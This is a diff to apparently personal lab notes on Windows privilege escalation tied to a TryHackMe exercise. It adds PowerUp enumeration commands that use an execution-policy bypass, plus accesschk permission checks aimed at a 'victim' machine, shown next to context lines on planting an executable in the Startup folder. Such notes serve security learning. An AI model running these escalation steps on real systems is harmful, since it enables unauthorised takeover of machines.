@@ -11,6 +11,7 @@
 9. [Startup Applications](#startup-applications)
 10. [Service Permissions](#service-permissions)
 11. https://www.silver-garcia.com/windows-privilege-escalation/
+12. https://www.aldeid.com/wiki/TryHackMe-Windows-PrivEsc-Arena
 
 
 **Powerup tool** it is a tool that gives us info about all the weaknesses in our target including some processes
@@ -397,9 +398,16 @@ net localgroup administrators
 ![image](https://github.com/user-attachments/assets/eb03d49d-ea00-4232-98a0-38460c2791fc)
 
 ## Executable Files
+From powerup tool
+```shell
+powershell -ep bypass
+. ./powerUp.ps1
+Invoke-AllChecks
+```
+![image](https://github.com/user-attachments/assets/b5a4eb4c-615b-40b3-89ac-b093448af27d)
 
 ```shell
-#in victim cmd prompt
+# another way to check if the vulnerability exists. In victim cmd prompt:
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
 #'everyone' user group has all access permission on filepermservice.exe
 
@@ -447,6 +455,8 @@ move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 ```shell
 #binary paths
 #in windows cmd
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *
+
 C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
 #user has SERVICE_CHANGE_CONFIG permission
 
@@ -461,3 +471,9 @@ net localgroup administrators
 
 #we can also exploit unquoted service paths, if any exist
 ```
+![image](https://github.com/user-attachments/assets/72975ae2-917d-48cf-8bbb-e1c1dee3b0c9)
+![image](https://github.com/user-attachments/assets/0a9cef29-aedb-4da1-ba84-b3cf4be83340)
+![image](https://github.com/user-attachments/assets/1b81fd8e-b084-4195-bd14-633c2e124b57)
+
+
+
